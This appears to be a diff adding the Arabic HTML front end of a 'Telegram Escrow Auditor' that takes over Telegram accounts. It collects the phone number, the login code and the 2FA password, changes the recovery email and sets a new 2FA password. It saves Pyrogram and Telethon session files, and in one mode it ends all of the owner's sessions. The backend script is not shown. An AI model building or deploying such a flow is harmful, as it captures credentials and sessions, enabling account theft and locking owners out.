@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Escrow Auditor V3</title>
+    <link rel="stylesheet" href="style_v3.css">
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>🔐 Telegram Escrow Auditor</h1>
+            <p class="subtitle">نظام تحويل الحسابات الآمن</p>
+        </header>
+
+        <!-- Progress Steps -->
+        <div class="steps">
+            <div class="step" id="step-1">
+                <div class="step-num">1</div>
+                <div class="step-label">تسجيل الدخول</div>
+            </div>
+            <div class="step" id="step-2">
+                <div class="step-num">2</div>
+                <div class="step-label">التحقق</div>
+            </div>
+            <div class="step" id="step-3">
+                <div class="step-num">3</div>
+                <div class="step-label">تغيير الإيميل</div>
+            </div>
+            <div class="step" id="step-4">
+                <div class="step-num">4</div>
+                <div class="step-label">الفحص الأمني</div>
+            </div>
+            <div class="step" id="step-5">
+                <div class="step-num">5</div>
+                <div class="step-label">الإنهاء</div>
+            </div>
+            <div class="step" id="step-6">
+                <div class="step-num">6</div>
+                <div class="step-label">اكتمال</div>
+            </div>
+        </div>
+
+        <!-- Status Message -->
+        <div id="status-message" class="status-box hidden"></div>
+
+        <!-- View 1: Phone Input -->
+        <div id="view-phone" class="view">
+            <div class="card">
+                <h2>📱 إدخال رقم الهاتف</h2>
+                <div class="form-group">
+                    <label for="phone-input">رقم الهاتف (مع رمز الدولة)</label>
+                    <input type="tel" id="phone-input" placeholder="+201234567890" dir="ltr">
+                </div>
+                <div class="form-group">
+                    <label for="transfer-mode">وضع التحويل</label>
+                    <select id="transfer-mode">
+                        <option value="bot_only">البوت فقط - خروج كامل من الحساب</option>
+                        <option value="user_keeps_session">احتفاظ بجلسة - المستخدم يبقى معه جلسة</option>
+                    </select>
+                    <small class="hint">
+                        <strong>البوت فقط:</strong> يتم إنهاء جميع جلسات المستخدم، تبقى جلسات البوت فقط<br>
+                        <strong>احتفاظ بجلسة:</strong> المستخدم يحتفظ بجلسة واحدة مع تغيير الإيميل وكلمة المرور
+                    </small>
+                </div>
+                <button id="btn-send-code" onclick="sendCode()" class="btn-primary">
+                    إرسال كود التحقق
+                </button>
+            </div>
+        </div>
+
+        <!-- View 2: Code Verification -->
+        <div id="view-code" class="view hidden">
+            <div class="card">
+                <h2>🔢 إدخال كود التحقق</h2>
+                <p>تم إرسال كود التحقق إلى تطبيق تيليجرام</p>
+                <div class="form-group">
+                    <label for="code-input">كود التحقق</label>
+                    <input type="text" id="code-input" placeholder="12345" maxlength="6" dir="ltr">
+                </div>
+                <button id="btn-verify-code" onclick="verifyCode()" class="btn-primary">
+                    تحقق
+                </button>
+            </div>
+        </div>
+
+        <!-- View 2b: 2FA Password -->
+        <div id="view-2fa" class="view hidden">
+            <div class="card">
+                <h2>🔐 التحقق بخطوتين</h2>
+                <p>الحساب محمي بالتحقق بخطوتين</p>
+                <div class="form-group">
+                    <label for="2fa-input">كلمة المرور</label>
+                    <input type="password" id="2fa-input" placeholder="أدخل كلمة مرور 2FA">
+                    <small id="2fa-hint" class="hint"></small>
+                </div>
+                <button id="btn-verify-2fa" onclick="verify2FA()" class="btn-primary">
+                    تحقق
+                </button>
+            </div>
+        </div>
+
+        <!-- View 3: Email Change -->
+        <div id="view-email" class="view hidden">
+            <div class="card">
+                <h2>📧 تغيير إيميل الاسترداد</h2>
+                <div id="target-email-display"></div>
+                <div id="email-instructions"></div>
+                
+                <div class="email-actions">
+                    <button id="btn-check-code" onclick="checkEmailCode()" class="btn-primary">
+                        التحقق من وصول الكود
+                    </button>
+                </div>
+                
+                <div id="email-code-display" class="code-display"></div>
+                
+                <button id="btn-confirm-email" onclick="confirmEmailChanged()" class="btn-success hidden">
+                    تأكيد تغيير الإيميل
+                </button>
+                
+                <button onclick="skipEmailStep()" class="btn-secondary">
+                    تخطي (الإيميل موجود مسبقاً)
+                </button>
+            </div>
+        </div>
+
+        <!-- View 4: Security Audit -->
+        <div id="view-audit" class="view hidden">
+            <div class="card">
+                <h2>🔍 الفحص الأمني</h2>
+                <button id="btn-run-audit" onclick="runAudit()" class="btn-primary">
+                    بدء الفحص الأمني
+                </button>
+                <div id="audit-log" class="audit-log"></div>
+                <button id="btn-proceed-finalize" onclick="proceedToFinalize()" class="btn-success hidden">
+                    متابعة للإنهاء
+                </button>
+            </div>
+        </div>
+
+        <!-- View 5: Finalize -->
+        <div id="view-finalize" class="view hidden">
+            <div class="card">
+                <h2>✅ إنهاء العملية</h2>
+                <p>سيتم إنشاء كلمة مرور قوية جديدة وحفظ الجلسات</p>
+                
+                <div class="form-group">
+                    <label for="current-2fa-password">كلمة مرور 2FA الحالية (إن وجدت)</label>
+                    <input type="password" id="current-2fa-password" placeholder="اتركها فارغة إذا لم يكن هناك 2FA">
+                </div>
+                
+                <div class="warning-box">
+                    ⚠️ <strong>تنبيه:</strong> سيتم:
+                    <ul>
+                        <li>إنشاء كلمة مرور 2FA جديدة قوية</li>
+                        <li>حفظ جلسات Pyrogram و Telethon</li>
+                        <li id="mode-action"></li>
+                    </ul>
+                </div>
+                
+                <button id="btn-finalize" onclick="finalizeAccount()" class="btn-success">
+                    إنهاء العملية
+                </button>
+            </div>
+        </div>
+
+        <!-- View 6: Complete -->
+        <div id="view-complete" class="view hidden">
+            <div class="card">
+                <div id="complete-message"></div>
+                <button onclick="location.reload()" class="btn-primary">
+                    بدء عملية جديدة
+                </button>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <footer>
+            <p>Telegram Escrow Auditor V3 | <a href="/api/v1/docs/internal" target="_blank">API Documentation</a></p>
+        </footer>
+    </div>
+
+    <script src="app_v3.js"></script>
+    <script>
+        function skipEmailStep() {
+            setStep(4);
+            showView('view-audit');
+        }
+    </script>
+</body>
+</html>
